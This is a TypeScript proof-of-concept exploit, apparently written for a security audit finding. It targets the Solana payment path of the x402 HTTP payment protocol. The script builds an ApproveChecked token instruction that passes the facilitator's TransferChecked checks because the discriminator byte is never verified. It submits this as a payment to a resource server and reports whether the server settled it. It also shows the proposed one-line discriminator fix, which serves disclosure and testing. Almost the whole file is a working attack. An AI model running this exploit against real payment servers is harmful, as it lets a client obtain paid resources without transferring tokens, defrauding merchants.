import { config } from "dotenv";
import { x402HTTPClient } from "@x402/fetch";
import type { PaymentPayload, PaymentRequirements } from "@x402/core/types";
import {
  DEFAULT_COMPUTE_UNIT_LIMIT,
  DEFAULT_COMPUTE_UNIT_PRICE_MICROLAMPORTS,
  MAX_MEMO_BYTES,
  MEMO_PROGRAM_ADDRESS,
  createRpcClient,
  resolveBlockhash,
} from "@x402/svm";
import {
  getSetComputeUnitLimitInstruction,
  setTransactionMessageComputeUnitPrice,
} from "@solana-program/compute-budget";
import {
  getApproveCheckedInstructionDataEncoder,
  getTransferCheckedInstructionDataEncoder,
  parseTransferCheckedInstruction as parseTransferCheckedInstructionSpl,
  TOKEN_PROGRAM_ADDRESS,
} from "@solana-program/token";
import {
  fetchMint,
  fetchToken,
  findAssociatedTokenPda,
  getApproveCheckedInstruction,
  parseTransferCheckedInstruction as parseTransferCheckedInstruction2022,
  TOKEN_2022_PROGRAM_ADDRESS,
} from "@solana-program/token-2022";
import {
  appendTransactionMessageInstructions,
  createTransactionMessage,
  getBase64EncodedWireTransaction,
  partiallySignTransactionMessageWithSigners,
  pipe,
  prependTransactionMessageInstruction,
  setTransactionMessageFeePayer,
  setTransactionMessageLifetimeUsingBlockhash,
  type Address,
  createKeyPairSignerFromBytes,
} from "@solana/kit";
import { base58 } from "@scure/base";

config();

const IX_TOKEN_TRANSFER_CHECKED = 12;

const svmPrivateKey = process.env.SVM_PRIVATE_KEY;
const baseURL = process.env.RESOURCE_SERVER_URL ?? "http://localhost:4021";
const endpointPath = process.env.ENDPOINT_PATH ?? "/weather";
const url = `${baseURL}${endpointPath}`;
const customRpcUrl = process.env.SVM_RPC_URL;

if (!svmPrivateKey) {
  console.error("SVM_PRIVATE_KEY is required");
  process.exit(1);
}

/**
 * Encodes bytes as a hex string for instruction dumps.
 *
 * @param data - Bytes to encode.
 * @returns Hex encoding of `data`.
 */
function hex(data: Uint8Array): string {
  return Buffer.from(data).toString("hex");
}

/**
 * JSON.stringify that serializes bigint as a decimal string.
 *
 * @param value - Value to serialize.
 * @returns JSON string.
 */
function jsonStringify(value: unknown): string {
  return JSON.stringify(value, (_key, v) => (typeof v === "bigint" ? v.toString() : v));
}

/**
 * Unwraps a Solana Kit Option-like address to a string or null.
 *
 * @param option - Option, address string, or other value.
 * @returns Address string, or null when the option is None.
 */
function optionAddress(option: unknown): string | null {
  if (option == null) {
    return null;
  }
  if (typeof option === "string") {
    return option;
  }
  if (typeof option === "object") {
    if ("__option" in option && (option as { __option: string }).__option === "None") {
      return null;
    }
    if ("value" in option) {
      return String((option as { value: unknown }).value);
    }
  }
  return String(option);
}

/**
 * Reads the payment amount from requirements (`amount` or `maxAmountRequired`).
 *
 * @param requirements - Payment requirements from the resource server.
 * @returns Amount as bigint.
 */
function getAmount(requirements: PaymentRequirements): bigint {
  if ("amount" in requirements && requirements.amount != null) {
    return BigInt(requirements.amount);
  }
  if ("maxAmountRequired" in requirements) {
    const maxAmount = (requirements as { maxAmountRequired?: string }).maxAmountRequired;
    if (maxAmount != null) {
      return BigInt(maxAmount);
    }
  }
  throw new Error("Payment requirements missing amount");
}

/**
 * Demonstrates F-01: verifyStaticPath accepts ApproveChecked (discriminator 13)
 * as TransferChecked (12) because the codegen parser never asserts the discriminator.
 *
 * Builds a malicious x402 payment transaction, shows local parser/check behavior,
 * submits it to a resource server, and inspects the attacker's token account afterward.
 */
async function main(): Promise<void> {
  const attacker = await createKeyPairSignerFromBytes(base58.decode(svmPrivateKey!));
  const httpClient = new x402HTTPClient();

  console.log("F-01  SVM exact: ApproveChecked accepted as TransferChecked");
  console.log("=".repeat(78));
  console.log(`Server:   ${url}`);
  console.log(`Attacker: ${attacker.address}`);
  console.log("");

  console.log("Step 0 — fetch 402 payment requirements...");
  const initialResponse = await fetch(url);
  if (initialResponse.status !== 402) {
    throw new Error(`Expected 402, got ${initialResponse.status}. Is the server running?`);
  }

  let body: unknown;
  try {
    body = await initialResponse.json();
  } catch {
    throw new Error("Failed to parse 402 response body as JSON");
  }

  const paymentRequired = httpClient.getPaymentRequiredResponse(
    name => initialResponse.headers.get(name),
    body,
  );

  const requirements = paymentRequired.accepts.find(
    a => a.network.startsWith("solana") && a.scheme === "exact",
  );
  if (!requirements) {
    throw new Error("No Solana exact payment option found in 402 response");
  }

  const amount = getAmount(requirements);
  const feePayer = requirements.extra?.feePayer as Address | undefined;
  if (!feePayer) {
    throw new Error("feePayer missing from payment requirements extra");
  }

  console.log("Fixtures");
  console.log(`  requirements.asset   = ${requirements.asset}`);
  console.log(`  requirements.payTo   = ${requirements.payTo}`);
  console.log(`  requirements.amount  = ${amount.toString()}`);
  console.log(`  facilitator feePayer = ${feePayer}`);
  console.log(`  attacker             = ${attacker.address}`);
  console.log("");

  const rpc = createRpcClient(requirements.network, customRpcUrl);
  const mint = await fetchMint(rpc, requirements.asset as Address);
  const tokenProgramAddress = mint.programAddress;
  const decimals = mint.data.decimals;

  if (
    tokenProgramAddress.toString() !== TOKEN_PROGRAM_ADDRESS.toString() &&
    tokenProgramAddress.toString() !== TOKEN_2022_PROGRAM_ADDRESS.toString()
  ) {
    throw new Error("Asset was not created by a known token program");
  }

  const [attackerAta] = await findAssociatedTokenPda({
    mint: requirements.asset as Address,
    owner: attacker.address,
    tokenProgram: tokenProgramAddress,
  });
  const [payToAta] = await findAssociatedTokenPda({
    mint: requirements.asset as Address,
    owner: requirements.payTo as Address,
    tokenProgram: tokenProgramAddress,
  });

  console.log(`  attacker ATA                   = ${attackerAta}`);
  console.log(`  payTo ATA (expected destination) = ${payToAta}`);
  console.log("");

  const legitData = getTransferCheckedInstructionDataEncoder().encode({
    amount,
    decimals,
  });
  const evilData = getApproveCheckedInstructionDataEncoder().encode({
    amount,
    decimals,
  });

  console.log("Step 1 — build instruction data with real @solana-program/token encoders");
  console.log(`  [legit  TransferChecked] token ix data = ${hex(legitData)} (10 bytes)`);
  console.log(`  [EVIL   ApproveChecked ] token ix data = ${hex(evilData)} (10 bytes)`);
  console.log("  -> identical except the FIRST BYTE: 0c vs 0d");
  console.log("");

  const maliciousIx = getApproveCheckedInstruction(
    {
      source: attackerAta,
      mint: requirements.asset as Address,
      delegate: payToAta,
      owner: attacker,
      amount,
      decimals,
    },
    { programAddress: tokenProgramAddress },
  );

  const parseTransferCheckedInstruction =
    tokenProgramAddress.toString() === TOKEN_PROGRAM_ADDRESS.toString()
      ? parseTransferCheckedInstructionSpl
      : parseTransferCheckedInstruction2022;

  console.log("Step 2 — does the real parser reject discriminator 13?");
  let parsed: ReturnType<typeof parseTransferCheckedInstructionSpl>;
  try {
    parsed = parseTransferCheckedInstruction(maliciousIx as never);
    console.log("  parseTransferCheckedInstruction threw : NO");
  } catch (error) {
    console.log("  parseTransferCheckedInstruction threw : YES");
    console.log(`  error: ${error instanceof Error ? error.message : String(error)}`);
    throw new Error("Parser rejected ApproveChecked — vulnerability may already be patched");
  }

  console.log(`  decoded .data                        : ${jsonStringify(parsed.data)}`);
  console.log(`  accounts.destination                 : ${parsed.accounts.destination.address}`);
  console.log(`  accounts.authority                   : ${parsed.accounts.authority.address}`);
  console.log(`  accounts.mint                        : ${parsed.accounts.mint.address}`);
  console.log("");

  const semanticChecks = {
    "program allowlist":
      tokenProgramAddress.toString() === TOKEN_PROGRAM_ADDRESS.toString() ||
      tokenProgramAddress.toString() === TOKEN_2022_PROGRAM_ADDRESS.toString(),
    "authority not facilitator": parsed.accounts.authority.address !== feePayer,
    "mint === requirements.asset": parsed.accounts.mint.address === requirements.asset,
    "destination === payTo ATA": parsed.accounts.destination.address === payToAta,
    "amount === requirements.amount": parsed.data.amount === amount,
  };

  console.log("  Replay Path-1 semantic checks against parsed ApproveChecked:");
  for (const [label, ok] of Object.entries(semanticChecks)) {
    console.log(`    ${ok ? "PASS" : "FAIL"}  ${label}`);
  }
  console.log(
    `  => verifyStaticPath would ACCEPT: ${Object.values(semanticChecks).every(Boolean)}`,
  );
  console.log("");

  const patchedGuardPassesLegit =
    legitData.length >= 10 && legitData[0] === IX_TOKEN_TRANSFER_CHECKED;
  const patchedGuardRejectsEvil =
    !evilData || evilData.length < 10 || evilData[0] !== IX_TOKEN_TRANSFER_CHECKED;

  console.log("Step 3 — proposed one-line discriminator guard");
  console.log(
    `  patched guard on legit TransferChecked : ${patchedGuardPassesLegit ? "PASS" : "FAIL"}`,
  );
  console.log(
    `  patched guard on evil  ApproveChecked  : ${patchedGuardRejectsEvil ? "REJECT" : "PASS"}`,
  );
  console.log("");

  const sellerMemo = requirements.extra?.memo as string | undefined;
  let memoData: Uint8Array;
  if (sellerMemo) {
    memoData = new TextEncoder().encode(sellerMemo);
    if (memoData.byteLength > MAX_MEMO_BYTES) {
      throw new Error(`extra.memo exceeds maximum ${MAX_MEMO_BYTES} bytes`);
    }
  } else {
    const nonce = crypto.getRandomValues(new Uint8Array(16));
    memoData = new TextEncoder().encode(
      Array.from(nonce)
        .map(b => b.toString(16).padStart(2, "0"))
        .join(""),
    );
  }

  const memoIx = {
    programAddress: MEMO_PROGRAM_ADDRESS as Address,
    accounts: [] as const,
    data: memoData,
  };

  const latestBlockhash = await resolveBlockhash(rpc, requirements);

  const tx = pipe(
    createTransactionMessage({ version: 0 }),
    tx => setTransactionMessageComputeUnitPrice(DEFAULT_COMPUTE_UNIT_PRICE_MICROLAMPORTS, tx),
    tx => setTransactionMessageFeePayer(feePayer, tx),
    tx =>
      prependTransactionMessageInstruction(
        getSetComputeUnitLimitInstruction({ units: DEFAULT_COMPUTE_UNIT_LIMIT }),
        tx,
      ),
    tx => appendTransactionMessageInstructions([maliciousIx, memoIx], tx),
    tx => setTransactionMessageLifetimeUsingBlockhash(latestBlockhash, tx),
  );

  const signedTransaction = await partiallySignTransactionMessageWithSigners(tx);
  const wireTransaction = getBase64EncodedWireTransaction(signedTransaction);

  const paymentPayload: PaymentPayload = {
    x402Version: paymentRequired.x402Version,
    payload: { transaction: wireTransaction },
    resource: paymentRequired.resource,
    accepted: requirements,
    ...(paymentRequired.extensions ? { extensions: paymentRequired.extensions } : {}),
  };

  const paymentHeaders = httpClient.encodePaymentSignatureHeader(paymentPayload);

  console.log("Step 4 — submit malicious ApproveChecked payment to resource server...");
  const paidResponse = await fetch(url, { headers: paymentHeaders });

  let responseBody: unknown;
  try {
    responseBody = await paidResponse.json();
  } catch {
    responseBody = await paidResponse.text();
  }

  let paymentResponse: unknown;
  try {
    paymentResponse = httpClient.getPaymentSettleResponse(name => paidResponse.headers.get(name));
  } catch {
    paymentResponse = null;
  }

  console.log(`  HTTP status: ${paidResponse.status}`);
  console.log(`  body:        ${jsonStringify(responseBody)}`);
  if (paymentResponse) {
    console.log(`  settlement:  ${jsonStringify(paymentResponse)}`);
  }
  console.log("");

  const settlementSuccess =
    paidResponse.status === 200 &&
    paymentResponse != null &&
    typeof paymentResponse === "object" &&
    "success" in paymentResponse &&
    (paymentResponse as { success?: boolean }).success === true;

  if (settlementSuccess) {
    console.log("Step 5 — inspect attacker ATA on-chain after settlement...");
    try {
      const tokenAccount = await fetchToken(rpc, attackerAta);
      const delegate = optionAddress(tokenAccount.data.delegate);

      console.log(`  attacker ATA amount           = ${tokenAccount.data.amount.toString()}`);
      console.log(`  attacker ATA delegate         = ${delegate ?? "(none)"}`);
      console.log(
        `  attacker ATA delegated_amount = ${tokenAccount.data.delegatedAmount.toString()}`,
      );
      console.log(
        `  merchant ATA unchanged check  = delegate should equal payTo ATA (${payToAta})`,
      );

      if (delegate === payToAta && tokenAccount.data.delegatedAmount === amount) {
        console.log(
          "  => On-chain effect confirmed: ApproveChecked set delegate to merchant ATA, moved 0 tokens",
        );
      }
    } catch (error) {
      console.log(
        `  Could not fetch attacker ATA (create/fund the ATA first): ${
          error instanceof Error ? error.message : String(error)
        }`,
      );
    }
  }

  console.log("");
  console.log("=".repeat(78));
  if (settlementSuccess) {
    console.log("VERDICT: VULNERABLE — server accepted and settled ApproveChecked as payment");
    console.log("The facilitator verified and broadcast a transaction that approves the merchant");
    console.log("ATA as delegate instead of transferring tokens.");
  } else if (paidResponse.status === 200) {
    console.log(
      "VERDICT: INCONCLUSIVE — request succeeded but settlement header missing or failed",
    );
  } else {
    console.log("VERDICT: PROTECTED — server rejected the malicious payment");
    console.log(
      "Either verifyStaticPath now checks the discriminator, or settlement failed on-chain.",
    );
  }
  console.log("=".repeat(78));
}

main().catch(error => {
  console.error(error?.message ?? error);
  process.exit(1);
});
